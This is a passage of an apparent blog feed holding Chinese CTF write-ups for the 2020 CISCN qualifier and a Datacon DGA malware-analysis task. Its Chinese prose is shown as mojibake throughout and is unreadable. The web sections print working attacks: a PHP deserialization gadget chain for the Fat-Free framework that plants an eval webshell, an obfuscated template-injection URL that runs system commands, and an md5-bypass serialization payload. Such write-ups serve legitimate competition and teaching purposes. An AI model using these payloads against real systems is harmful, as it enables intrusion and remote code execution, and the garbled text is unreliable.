&lt;h3 id=&quot;å¼ºç½‘å…ˆé”‹-è¾…åŠ©&quot;&gt;&lt;a href=&quot;#å¼ºç½‘å…ˆé”‹-è¾…åŠ©&quot; class=&quot;headerlink&quot; title=&quot;å¼ºç½‘å…ˆé”‹-è¾…åŠ©&quot;&gt;&lt;/a&gt;å¼ºç½‘å…ˆé”‹-è¾…åŠ©&lt;/h3&gt;&lt;p&gt;ååºåˆ—åŒ–é€ƒé€¸ï¼Œå‚è€ƒ&lt;a href=&quot;https://m0nit0r.top/2020/02/05/object-injection-caused-by-PHP-string-escape/#Joomlaé€ƒé€¸&quot;&gt;https://m0nit0r.top/2020/02/05/object-injection-caused-by-PHP-string-escape/#Joomla%E9%80%83%E9%80%B8&lt;/a&gt;å†åŠ ä¸Šç»•è¿‡wakeupï¼Œä»¥åŠååºåˆ—åŒ–ä¸­ä½¿ç”¨å¤§å†™Så¯ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºçš„ä¸€äº›ç»•è¿‡æ–¹å¼ã€‚&lt;/p&gt;
&lt;p&gt;éœ€è¦æ³¨æ„è°ƒè¯•çš„æ—¶å€™æœ€å¥½urlç¼–ç ï¼Œç›´æ¥echo \0 æ— æ³•æ˜¾ç¤ºï¼Œç®—è¦†ç›–é•¿åº¦çš„æ—¶å€™å®¹æ˜“å‡ºé”™ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
    
    <category term="wp" scheme="https://igml.top/categories/CTF/wp/"/>
    
    
    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>2020 ciscn åˆèµ› writeup</title>
    <link href="https://igml.top/2020/08/21/2020-ciscn/"/>
    <id>https://igml.top/2020/08/21/2020-ciscn/</id>
    <published>2020-08-21T02:28:13.000Z</published>
    <updated>2020-08-21T02:56:10.506Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™å›½èµ›äº”ä¸ª Web åŠ èµ·æ¥ä¸åˆ°200åˆ†ï¼ŒçœŸå®ã€‚</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>éœ€è¦é€šè¿‡ call_user_func_array è§¦å‘å­è¿›ç¨‹å´©æºƒï¼Œè¿›åˆ°çˆ¶è¿›ç¨‹é‡Œã€‚</p><p><code>?a=stream_socket_server</code></p><p>ï¼ˆè¿™æ˜¯å•¥ Web é¢˜â€¦ï¼‰</p><h3 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h3><p>çœ‹åˆ° fatfreeï¼Œæƒ³åˆ°äº† WMCTF é‚£ä¸ªwebwebï¼Œdiffä¸€ä¸‹å‘ç°æŠŠåŸæ¥é‚£ä¸ªé“¾å­ insert æ–¹æ³•ç»™æ³¨é‡Šäº†ï¼Œå†æ‰¾ä¸ªåˆ«çš„ï¼Œæ‰¾åˆ°äº†\DB\jig ä¸‹çš„mapperç±»ï¼š</p><p><img src="/2020/08/21/2020-ciscn/image-20200821103709773.png" alt="image-20200821103709773"></p><p>æ”¹ä¸€ä¸‹expï¼Œå¯ä»¥RCEï¼Œsystemä¸€ä¸‹å‘ç°è¢«banäº†ï¼Œæƒ³åŠæ³•å…ˆå†™ä¸ªshellï¼Œä¸è¿‡è¿™ä¸ªcall_user_func_arrayç”¨èµ·æ¥æ¯”è¾ƒéš¾å—ã€‚</p><p><img src="/2020/08/21/2020-ciscn/image-20200821103823717.png" alt="image-20200821103823717"></p><p>å†çœ‹ä¸€ä¸‹diffç»“æœï¼Œå‘ç° insert æ–¹æ³•ç«Ÿç„¶å¤šäº† writeæ“ä½œï¼š</p><p><img src="/2020/08/21/2020-ciscn/image-20200821103418678.png" alt="image-20200821103418678"></p><p>ç›´æ¥å†™ shell å°±å¥½äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">Jig</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">db</span>;</span><br><span class="line">        <span class="keyword">protected</span> $file = <span class="string">&#x27;gmmml.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> $document = <span class="string">&#x27;&lt;?php @eval($_POST[gml]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$db</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Jig</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">format</span> = 0;</span><br><span class="line">        <span class="keyword">protected</span> $dir = <span class="string">&#x27;./&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">server</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$server</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server = $server;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $events;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$events</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">F3</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">events</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$events</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $a = <span class="keyword">new</span> DB\Jig();</span><br><span class="line">    $b = <span class="keyword">new</span> DB\Jig\Mapper($a);</span><br><span class="line">    $c = <span class="keyword">new</span> F3(<span class="keyword">array</span>(<span class="string">&#x27;disconnect&#x27;</span> =&gt; <span class="keyword">array</span>($b, <span class="string">&quot;insert&quot;</span>)));</span><br><span class="line">    $d = <span class="keyword">new</span> CLI\Agent($c);</span><br><span class="line">    $e = <span class="keyword">new</span> CLI\WS($d);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($e));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°shellï¼ŒæŠŠ PHP7 é‚£ä¸ªç»•è¿‡ disable_function çš„è„šæœ¬æä¸Šå»å°±å¥½äº†ã€‚</p><h3 id="RCEME"><a href="#RCEME" class="headerlink" title="RCEME"></a>RCEME</h3><p><a href="https://www.anquanke.com/post/id/212603#h2-9">https://www.anquanke.com/post/id/212603#h2-9</a>ï¼Œæœ€åä¸€ä¸ª exp ç›´æ¥æ‰“ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2ze2t1c804gx8zlnp248.cloudeci1.ichunqiu.com&#x2F;?a&#x3D;&#123;if:(implode(%27%27,%20[%27c%27,%27a%27,%27l%27,%27l%27,%27_%27,%27u%27,%27s%27,%27e%27,%27r%27,%27_%27,%27f%27,%27u%27,%27n%27,%27c%27])(implode(%27%27,[%27s%27,%27y%27,%27s%27,%27t%27,%27e%27,%27m%27]),%27cat%20&#x2F;flag%27))&#125;&#123;end%20if&#125;</span><br></pre></td></tr></table></figure><h3 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h3><p>æœä¸€å‘è¿™ä¸ªset-value åŸå‹é“¾æ±¡æŸ“ï¼š<a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a>ã€‚</p><p>ç›´æ¥æ‰“ï¼š</p><p><img src="/2020/08/21/2020-ciscn/image-20200821104630661.png" alt="image-20200821104630661"></p><p><img src="/2020/08/21/2020-ciscn/image-20200821104643227.png" alt="image-20200821104643227"></p><h3 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h3><p>æƒ³åŠæ³•ç»•è¿‡ md5ï¼Œå¼€å§‹çš„æ€è·¯æ˜¯é€šè¿‡ç±»ï¼Œä¸è¿‡exceptionå’Œerrorç±» __toString é•¿åº¦å¤ªé•¿äº†ï¼Œæ²¡æ³•ç»•è¿‡ã€‚åæ¥å‘ç° INF å¯ä»¥ç»•è¿‡ï¼ŒINF å˜æˆå­—ç¬¦ä¸²åæ˜¯ â€œINFâ€ï¼Œmd5 æ—¶ä¼šè½¬æˆå­—ç¬¦ä¸²â€INFâ€ï¼Œæ‰€ä»¥ç›¸ç­‰ã€‚è€Œ (string)INF != INFï¼Œå¯ä»¥ç»•è¿‡ã€‚</p><p><img src="/2020/08/21/2020-ciscn/image-20200821105029180.png" alt="image-20200821105029180"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $trick1=INF;</span><br><span class="line">   <span class="keyword">public</span> $trick2=INF;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line">var_dump((<span class="keyword">string</span>)$a-&gt;trick1);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="lfsr"><a href="#lfsr" class="headerlink" title="lfsr"></a>lfsr</h3><p>æ¢å¤ maskï¼Œ100ä¸ªæ–¹ç¨‹ï¼Œè§£æ–¹ç¨‹å³å¯ã€‚</p><p>Python è§£æ–¹ç¨‹è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mask</span>(<span class="params">stream</span>):</span></span><br><span class="line">    dim = <span class="number">100</span></span><br><span class="line">    magic = [<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">list</span>(stream[i:i + <span class="number">100</span>])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">    cipher = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">list</span>(stream[<span class="number">100</span>:]))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(cipher) == <span class="number">100</span></span><br><span class="line">    <span class="comment"># é«˜æ–¯æ¶ˆå…ƒ</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(j, dim):</span><br><span class="line">            <span class="keyword">if</span> magic[i][j] == <span class="number">1</span>:</span><br><span class="line">                magic[i], magic[j] = magic[j], magic[i]</span><br><span class="line">                cipher[i], cipher[j] = cipher[j], cipher[i]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">            <span class="keyword">if</span> magic[i][j] == <span class="number">1</span> <span class="keyword">and</span> i != j:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">                    magic[i][k] ^= magic[j][k]</span><br><span class="line">                cipher[i] ^= cipher[j]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>((<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, cipher)))[::<span class="number">-1</span>], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read(<span class="number">200</span>).strip()</span><br><span class="line"><span class="built_in">print</span> get_mask(data)</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç”¨sageè§£å¸Œå°”å¯†ç çš„æ–¹æ³•ç›´æ¥è§£ï¼ˆå¼‚æˆ–ç›¸åŠ å¯ä»¥å¯¹åº”ä¹˜æ³•ç›¸åŠ æ¨¡2ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">stream = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read(<span class="number">200</span>).strip()</span><br><span class="line">A = [<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">list</span>(stream[i:i + <span class="number">100</span>])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">res = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">list</span>(stream[<span class="number">100</span>:]))</span><br><span class="line">R = IntegerModRing(<span class="number">2</span>)</span><br><span class="line">A = Matrix(R,A)</span><br><span class="line">res = vector(R,res)</span><br><span class="line">ans = A.solve_right(res)</span><br><span class="line">print(<span class="built_in">int</span>((<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, <span class="built_in">list</span>(ans))))[::<span class="number">-1</span>], <span class="number">2</span>))</span><br></pre></td></tr></table></figure><h3 id="bd"><a href="#bd" class="headerlink" title="bd"></a>bd</h3><p>d è¾ƒå°ï¼ŒBoneh_Durfee æ”»å‡»ã€‚</p><p><a href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage">https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;è¿™å›½èµ›äº”ä¸ª Web åŠ èµ·æ¥ä¸åˆ°200åˆ†ï¼ŒçœŸå®ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ciscn" scheme="https://igml.top/categories/ciscn/"/>
    
    <category term="CTF" scheme="https://igml.top/categories/ciscn/CTF/"/>
    
    
    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
    
    <category term="ciscn" scheme="https://igml.top/tags/ciscn/"/>
    
  </entry>
  
  <entry>
    <title>2020 Datacon å¤§æ•°æ®å®‰å…¨åˆ†ææ¯”èµ›éƒ¨åˆ†é¢˜ç›® å†…æµ‹ç¬”è®°</title>
    <link href="https://igml.top/2020/08/16/2020-Datacon/"/>
    <id>https://igml.top/2020/08/16/2020-Datacon/</id>
    <published>2020-08-16T14:27:26.000Z</published>
    <updated>2020-08-17T02:38:40.432Z</updated>
    
    <content type="html"><![CDATA[<p>å»å¹´å‚åŠ äº†Datacon DNSæ¶æ„æµé‡æ–¹å‘çš„æ¯”èµ›ï¼Œæ‹¿äº†ç¬¬äº”ï¼Œå·®ç‚¹æ‹¿åˆ°å¥–orzï¼Œä»Šå¹´å‚åŠ äº†éƒ¨åˆ†èµ›é¢˜çš„å†…éƒ¨è¯„ä¼°ï¼Œä»¥ä¸‹æ˜¯åšé¢˜è®°å½•ã€‚</p><a id="more"></a><h1 id="DNS-æ¶æ„åŸŸååˆ†æé¢˜ç›®ä¸€-ç§å­å¯»æ‰¾è®°ä¹‹DGAç®—æ³•åˆ†æ"><a href="#DNS-æ¶æ„åŸŸååˆ†æé¢˜ç›®ä¸€-ç§å­å¯»æ‰¾è®°ä¹‹DGAç®—æ³•åˆ†æ" class="headerlink" title="DNS æ¶æ„åŸŸååˆ†æé¢˜ç›®ä¸€-ç§å­å¯»æ‰¾è®°ä¹‹DGAç®—æ³•åˆ†æ"></a>DNS æ¶æ„åŸŸååˆ†æé¢˜ç›®ä¸€-ç§å­å¯»æ‰¾è®°ä¹‹DGAç®—æ³•åˆ†æ</h1><h2 id="èµ›é¢˜ä¿¡æ¯"><a href="#èµ›é¢˜ä¿¡æ¯" class="headerlink" title="èµ›é¢˜ä¿¡æ¯"></a>èµ›é¢˜ä¿¡æ¯</h2><h3 id="è®¾è®¡è¯´æ˜"><a href="#è®¾è®¡è¯´æ˜" class="headerlink" title="è®¾è®¡è¯´æ˜"></a>è®¾è®¡è¯´æ˜</h3><p>DGAï¼ˆDomain generation algorithmï¼ŒåŸŸåç”Ÿæˆç®—æ³•ï¼‰æ˜¯ä¸€ç§åˆ©ç”¨ç‰¹å®šç§å­å­—ç¬¦ï¼Œç»“åˆåŠ å¯†ç®—æ³•ï¼Œè¿›è€Œç”Ÿæˆä¸€ç³»åˆ—ä¼ªéšæœºæ¶æ„åŸŸåçš„æ–¹æ³•ã€‚æ¶æ„è½¯ä»¶å¯ä½¿ç”¨DGAé€ƒé¿åŸŸåé»‘åå•çš„æ£€æµ‹ã€‚</p><p>æœ¬é¢˜ä¸­ï¼Œé€‰æ‰‹éœ€ä»ç»™å®šçš„DGAæ ·æœ¬ä¸­é€šè¿‡é€†å‘åˆ†æå‘ç°å…¶ä¸­å­˜åœ¨çš„DGAç®—æ³•ã€‚é€šè¿‡å¯¹DGAç®—æ³•çš„åˆ†æï¼Œæ ¹æ®ç»™å‡ºçš„åŒç®—æ³•ä½†ä¸åŒç§å­ç”Ÿäº§çš„åŸŸåè·å¾—æ–°çš„ç§å­ï¼Œæœ€ç»ˆç»™å‡ºä½¿ç”¨æ–°ç§å­ç”Ÿäº§çš„æ‰€æœ‰åŸŸåã€‚</p><h3 id="æ•°æ®è¯´æ˜"><a href="#æ•°æ®è¯´æ˜" class="headerlink" title="æ•°æ®è¯´æ˜"></a>æ•°æ®è¯´æ˜</h3><ul><li>sample1.exeã€sample2.exeã€sample3.exeï¼Œä¸åŒDGAç®—æ³•çš„ä¸‰ä¸ªæ ·æœ¬</li><li>20200510_domains1.txtã€20200510_domains2.txtã€20200510_domains3.txtï¼Œå„æ ·æœ¬å¯¹åº”çš„åŒç®—æ³•ä½†ä¸åŒç§å­çš„æ ·æœ¬ç”Ÿäº§çš„åŸŸåï¼Œè‹¥ç®—æ³•æ—¶é—´ç›¸å…³ï¼Œåˆ™ç”Ÿäº§æ—¶é—´ä¸º2020å¹´5æœˆ10æ—¥</li></ul><h3 id="æäº¤å½¢å¼"><a href="#æäº¤å½¢å¼" class="headerlink" title="æäº¤å½¢å¼"></a>æäº¤å½¢å¼</h3><p>é€‰æ‰‹æäº¤3ä¸ªtxtæ–‡ä»¶ï¼Œæäº¤æ–‡ä»¶çš„å‘½åè§„åˆ™å’Œå†…å®¹å¦‚ä¸‹ï¼š</p><ul><li><p>domains1.txt</p><p>ä½¿ç”¨sample1.exeä¸­ç®—æ³•å’Œæ–°ç§å­ç”Ÿäº§çš„ç®—æ³•è§„å®šä¸ªæ•°çš„åŸŸåã€‚æ¯ä¸ªåŸŸåä¸€è¡Œã€‚</p></li><li><p>domains2.txt</p><p>ä½¿ç”¨sample2.exeä¸­ç®—æ³•å’Œæ–°ç§å­ç”Ÿäº§çš„ç®—æ³•è§„å®šä¸ªæ•°çš„åŸŸåã€‚æ¯ä¸ªåŸŸåä¸€è¡Œã€‚</p></li><li><p>domains3.txt</p><p>ä½¿ç”¨sample3.exeä¸­ç®—æ³•å’Œæ–°ç§å­ç”Ÿäº§çš„ç®—æ³•è§„å®šä¸ªæ•°çš„åŸŸåã€‚æ¯ä¸ªåŸŸåä¸€è¡Œã€‚</p></li></ul><h2 id="è§£é¢˜è¿‡ç¨‹"><a href="#è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h2><p>è¿™ä¸ªé¢˜ä¸»è¦æ˜¯è€ƒå¯ŸåŸºæœ¬é€†å‘+ç®—æ³•åˆ†æï¼Œä¹‹å‰ä¹Ÿæ²¡åšè¿‡é€†å‘ï¼Œè¿™æ¬¡æ­£å¥½ç®—æ˜¯å…¥äº†é—¨ï¼Œè¸©äº†æŒºå¤šé€†å‘çš„å‘â€¦</p><h3 id="sample1"><a href="#sample1" class="headerlink" title="sample1"></a>sample1</h3><p>IDAæ‰“å¼€ï¼Œæ‰¾ä¸åˆ°mainå‡½æ•°ï¼Œæ–‡æœ¬æ¨¡å¼ä¸‹æœmainï¼Œæ‰¾åˆ°å…¥å£å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __main();</span><br><span class="line">  dga_v2(<span class="number">2020</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">0xFD6512BE</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹èµ·æ¥ï¼Œ2020ã€4ã€6æ˜¯æ—¥æœŸï¼Œæœ€åä¸€ä¸ªå‚æ•°æ˜¯ç§å­ï¼Œåç¼–è¯‘dga_v2å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">dga_v2</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> a2, <span class="keyword">char</span> a3, <span class="keyword">unsigned</span> <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+1Ch] [ebp-12Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">8</span>]; <span class="comment">// [esp+28h] [ebp-120h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v16[<span class="number">16</span>]; <span class="comment">// [esp+30h] [ebp-118h]</span></span><br><span class="line">  <span class="keyword">char</span> *v17[<span class="number">5</span>]; <span class="comment">// [esp+40h] [ebp-108h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [esp+54h] [ebp-F4h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp+58h] [ebp-F0h]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [esp+5Ch] [ebp-ECh]</span></span><br><span class="line">  <span class="keyword">int</span> v21[<span class="number">4</span>]; <span class="comment">// [esp+64h] [ebp-E4h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v22; <span class="comment">// [esp+74h] [ebp-D4h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [esp+CBh] [ebp-7Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v24[<span class="number">4</span>]; <span class="comment">// [esp+CCh] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [esp+D0h] [ebp-78h]</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)v24 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v25, <span class="number">0</span>, <span 